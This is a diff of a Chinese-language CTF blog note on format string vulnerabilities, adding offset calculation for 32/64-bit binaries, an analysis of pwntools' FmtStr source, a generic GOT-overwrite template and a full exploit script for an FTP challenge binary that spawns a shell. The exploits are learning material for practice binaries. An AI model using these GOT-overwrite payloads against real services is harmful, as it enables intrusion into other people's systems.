@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>格式化字符串漏洞学习 | Rin</title>
+  <title>格式化字符串 | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -105,7 +105,7 @@
 				    
 				    <li><a href="/categories/STACK-DynELF/" class="animsition-link">STACK - DynELF<small>(2)</small></a></li>
 				    
-				    <li><a href="/categories/STACK-Format/" class="animsition-link">STACK - Format<small>(3)</small></a></li>
+				    <li><a href="/categories/STACK-Format/" class="animsition-link">STACK - Format<small>(1)</small></a></li>
 				    
 				    <li><a href="/categories/STACK-OTHERS/" class="animsition-link">STACK - OTHERS<small>(1)</small></a></li>
 				    
@@ -208,8 +208,8 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2021-10-23T07:05:16.822Z" itemprop="datePublished">
-          2021-10-23
+      <time datetime="2022-03-18T17:22:00.000Z" itemprop="datePublished">
+          2022-03-19
       </time>
     
     
@@ -218,21 +218,22 @@
     
     
 </span>
-                <h1>格式化字符串漏洞学习</h1>
+                <h1>格式化字符串</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-zRYsUJgU" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-NuztVwgE" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"
     ></div> 
 
-<p>[TOC]</p>
-<h1 id="1）前言"><a href="#1）前言" class="headerlink" title="1）前言"></a>1）前言</h1><p>绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>
-<p>首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>
-<p>所以碰到这道题，算是又给我敲了第nn个警钟。</p>
-<p>非常清晰地告诉我：我是垃圾。</p>
-<h1 id="2）格式化字符串基本原理"><a href="#2）格式化字符串基本原理" class="headerlink" title="2）格式化字符串基本原理"></a>2）格式化字符串基本原理</h1><p>ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>
+
+
+<h1 id="1）前言"><a href="#1）前言" class="headerlink" title="1）前言"></a>1）前言</h1><p>​        绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>
+<p>​        首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>
+<p>​        所以碰到这道题，算是又给我敲了第nn个警钟。</p>
+<p>​        非常清晰地告诉我：我是垃圾。</p>
+<h1 id="2）格式化字符串基本原理"><a href="#2）格式化字符串基本原理" class="headerlink" title="2）格式化字符串基本原理"></a>2）格式化字符串基本原理</h1><p>​        ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>
 <h3 id="格式化字符串参数"><a href="#格式化字符串参数" class="headerlink" title="格式化字符串参数"></a>格式化字符串参数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>
 
 <ul>
@@ -274,6 +275,57 @@
 <li>一直%s，容易引用不合法的地址，造成程序崩溃   </li>
 <li>通过打印的相关内存信息，泄露内存布局，获得有用的信息</li>
 </ol>
+<p>重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现</p>
+<h3 id="1）32位偏移计算原理"><a href="#1）32位偏移计算原理" class="headerlink" title="1）32位偏移计算原理"></a>1）32位偏移计算原理</h3><p>​    其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。</p>
+<p>​    准确来说应该是格式化字符串在栈上的偏移。</p>
+<p>​    原理也比较简单：x86架构下，格式化字符串是通过栈传递的。</p>
+<p>​    然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。</p>
+<p>​    举一个例子，源码来源于<a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">3.1.1 格式化字符串漏洞</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test1.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d %s&quot;</span>, <span class="string">&quot;Hello World!&quot;</span>, <span class="number">233</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。</p>
+<p>​    我们以32位编译。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 test1.c -o test1</span><br></pre></td></tr></table></figure>
+
+<p>​    在main函数处下一个断点。然后执行到断点处。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png" alt="截屏2021-10-28 下午11.35.36"></p>
+<p>​    随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从<code>stack</code></p>
+<p>部分我们可以看到，此时栈里已经有一个参数”\n”。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png" alt="截屏2021-10-28 下午11.38.15">    </p>
+<p>​    继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png" alt="截屏2021-10-28 下午11.40.00"></p>
+<p>​    可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子：</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png" alt="截屏2021-10-28 下午11.41.43"></p>
+<p>​    然后回忆一下被调函数参数和局部变量压栈的过程：</p>
+<p>​    主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。</p>
+<p>​    这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。    </p>
+<h3 id="2）64位偏移计算原理"><a href="#2）64位偏移计算原理" class="headerlink" title="2）64位偏移计算原理"></a>2）64位偏移计算原理</h3><p>​        原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。</p>
+<h3 id="3）-pwntools-fmtstr工具"><a href="#3）-pwntools-fmtstr工具" class="headerlink" title="3） pwntools_fmtstr工具"></a>3） pwntools_fmtstr工具</h3><p>​    在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。</p>
+<p>​    pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。</p>
+<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>​    例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算偏移量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    info = r.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line">  </span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line">offset = auto.offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 func 的 got 地址</span></span><br><span class="line">func_got = elf.got[<span class="string">&#x27;func&#x27;</span>]<span class="comment">#func通常是一些例如printf或puts的函数</span></span><br><span class="line">log.success(<span class="string">&quot;func_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(func_got)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 func 的真实地址</span></span><br><span class="line">payload = p32(func_got) + <span class="string">&#x27;%&#123;&#125;$s&#x27;</span>.<span class="built_in">format</span>(offset)</span><br><span class="line">r.send(payload)</span><br><span class="line">func_addr = u32(r.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">log.success(<span class="string">&quot;func_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(func_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 system 的真实地址</span></span><br><span class="line">system_addr = func_addr - (libc.symbols[<span class="string">&#x27;func&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">log.success(<span class="string">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>​    </p>
+<p>​    其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。</p>
+<h5 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h5><p>​    pwntools定义了一个<code>FmtStr</code>类，来实现格式化字符串漏洞的利用。</p>
+<p>​    ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是：<img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg" alt="IMG_0352"></p>
+<p>​    所以下图中的代码也就能够理解了，就是将参数传入实例本身。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png" alt="截屏2021-10-29 下午2.08.21"></p>
+<p>​    然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。</p>
+<p>​    很显然这个功能的实现是基于<code>find_offset</code>方法。</p>
+<p>​    方法的内容其实比较简单：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_offset</span>(<span class="params">self</span>):</span></span><br><span class="line">      marker = cyclic(<span class="number">20</span>)<span class="comment">#cyclic 20个字符</span></span><br><span class="line">      <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):<span class="comment">#从1-1000，爆破偏移量</span></span><br><span class="line">          leak = self.leak_stack(off, marker)</span><br><span class="line">          leak = pack(leak)<span class="comment">#leak = p(leak_stack)</span></span><br><span class="line">          pad = cyclic_find(leak[:<span class="number">4</span>])</span><br><span class="line">          <span class="keyword">if</span> pad &gt;= <span class="number">0</span> <span class="keyword">and</span> pad &lt; <span class="number">20</span>:</span><br><span class="line">              <span class="keyword">return</span> off, pad</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          log.error(<span class="string">&quot;Could not find offset to format string on stack&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>​    而实现方法<code>find_offset</code>，又依靠方法<code>leak_stack</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span>(<span class="params">self, offset, prefix=<span class="string">b&quot;&quot;</span></span>):</span></span><br><span class="line">    payload = <span class="string">b&quot;START%%%d$pEND&quot;</span> % offset</span><br><span class="line">    leak = self.execute_fmt(prefix + payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        leak = re.findall(<span class="string">br&quot;START(.*?)END&quot;</span>, leak, re.MULTILINE | re.DOTALL)[<span class="number">0</span>]</span><br><span class="line">        leak = <span class="built_in">int</span>(leak, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        leak = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> leak</span><br></pre></td></tr></table></figure>
+
+<p>​    <code>cyclic</code>的代码也顺便放一放（</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cyclic_find</span>(<span class="params">subseq, alphabet = <span class="literal">None</span>, n = <span class="literal">None</span></span>):</span> </span><br><span class="line">  <span class="keyword">if</span> n <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        n = context.cyclic_size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(subseq, six.integer_types):</span><br><span class="line">        subseq = packing.pack(subseq, <span class="built_in">bytes</span>=n)</span><br><span class="line">    subseq = packing._need_bytes(subseq, <span class="number">2</span>, <span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(subseq) != n:</span><br><span class="line">        log.warn_once(<span class="string">&quot;cyclic_find() expects %i-byte subsequences by default, you gave %r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Truncating the data at 4 bytes.  Specify cyclic_find(..., n=%i) to override this.&quot;</span>,</span><br><span class="line">            n, subseq, <span class="built_in">len</span>(subseq), <span class="built_in">len</span>(subseq))</span><br><span class="line">        subseq = subseq[:n]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> alphabet <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        alphabet = context.cyclic_alphabet</span><br><span class="line">    alphabet = packing._need_bytes(alphabet, <span class="number">2</span>, <span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(c <span class="keyword">not</span> <span class="keyword">in</span> alphabet <span class="keyword">for</span> c <span class="keyword">in</span> subseq):</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    n = n <span class="keyword">or</span> <span class="built_in">len</span>(subseq)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _gen_find(subseq, de_bruijn(alphabet, n))</span><br></pre></td></tr></table></figure>
+
+<p>​    之前一直对<code>cyclic</code>的实现抱有兴趣，抽个时间可以看看源码分析。</p>
+<p>​    </p>
 <h1 id="3）实际利用"><a href="#3）实际利用" class="headerlink" title="3）实际利用"></a>3）实际利用</h1><h2 id="1-goodluck"><a href="#1-goodluck" class="headerlink" title="1:goodluck"></a>1:goodluck</h2><p>话不多说，直接上例子。</p>
 <h4 id="程序逻辑分析"><a href="#程序逻辑分析" class="headerlink" title="程序逻辑分析"></a>程序逻辑分析</h4><p>第一步，清晰而准确的逆向是漏洞点利用的基础。</p>
 <p>首先，程序读取flag，通过<code>_IO_getc(fp)</code>，一个字符一个字符地将flag读入v10。</p>
@@ -351,7 +403,7 @@
 <p>这里<code>%8$s + p32(puts_got)</code>先把puts的got表传进去，然后再通过%8$s打印。</p>
 <p>然后接收信息，就是puts的got表地址。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8A%E5%8D%8811.13.31.png" alt="截屏2022-03-22 上午11.13.31"></p>
-<h4 id="利用格式化字符串覆盖puts的got表"><a href="#利用格式化字符串覆盖puts的got表" class="headerlink" title="利用格式化字符串覆盖puts的got表"></a>利用格式化字符串覆盖puts的got表</h4><h5 id="fmt模块实现"><a href="#fmt模块实现" class="headerlink" title="fmt模块实现"></a>fmt模块实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class="line">put(<span class="string">&#x27;/bin/sh;&#x27;</span>, payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ftp&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br></pre></td></tr></table></figure>
+<h4 id="利用格式化字符串覆盖puts的got表"><a href="#利用格式化字符串覆盖puts的got表" class="headerlink" title="利用格式化字符串覆盖puts的got表"></a>利用格式化字符串覆盖puts的got表</h4><h5 id="fmt模块实现"><a href="#fmt模块实现" class="headerlink" title="fmt模块实现"></a>fmt模块实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class="line">put(<span class="string">&#x27;/bin/sh;&#x27;</span>, payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ftp&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br></pre></td></tr></table></figure>
 
 <p>​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>
 <p>​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>
@@ -361,42 +413,47 @@
 <h4 id="调用show，实现getshell"><a href="#调用show，实现getshell" class="headerlink" title="调用show，实现getshell"></a>调用show，实现getshell</h4><p>最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。</p>
 <p>   <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8A%E5%8D%8811.33.03.png" alt="截屏2022-03-22 上午11.33.03"></p>
 <p>可以看到确实puts的got表被改为了system的地址。</p>
-<p>但是似乎哪里不太对的样子。</p>
-<p>  等等来调。</p>
+<p>但是感觉情况与我期待的并不一样，当调用<code>fmt_payload</code>module的时候，puts的got表并没有被修改，而是在最后show（）的时候才突然变成了system。<img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8B%E5%8D%883.54.02.png" alt="截屏2022-03-22 下午3.54.02"></p>
+<p>​        发现问题所在了。system的地址根本不是system。。真的逆天，这个确实不知道该怎么办了，got表也改了，函数参数也传入了，但是地址不对。。。为什么。</p>
 <h4 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">name</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    data = p.recv()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">name, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;then, enter the content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;rxraclhm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the addr of puts</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;puts got : &#x27;</span> + <span class="built_in">hex</span>(puts_got))</span><br><span class="line">put(<span class="string">b&#x27;aa&#x27;</span>, <span class="string">b&#x27;%8$s&#x27;</span> + p32(puts_got))</span><br><span class="line">puts_addr = u32(get(<span class="string">&#x27;aa&#x27;</span>)[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr : &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">system_off = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">puts_off = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_base = puts_addr - puts_off</span><br><span class="line">system_addr = libc_base + system_off</span><br><span class="line">log.success(<span class="string">&#x27;system addr : &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class="line">put(<span class="string">&#x27;/bin/sh;&#x27;</span>, payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ftp&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
+<h3 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h3><h4 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h4><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8B%E5%8D%884.27.16.png" alt="截屏2022-03-22 下午4.27.16"></p>
+<h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><p>​        没啥好逆的，输入字符，然后输出字符，纯纯格式化字符串。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  fgets(s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;exit\n&quot;</span>) );</span><br><span class="line">system(<span class="string">&quot;echo Goodbye&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
 
 
 
-
-
-
-
-
-
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79504011">缓冲区机制详解</a></p>
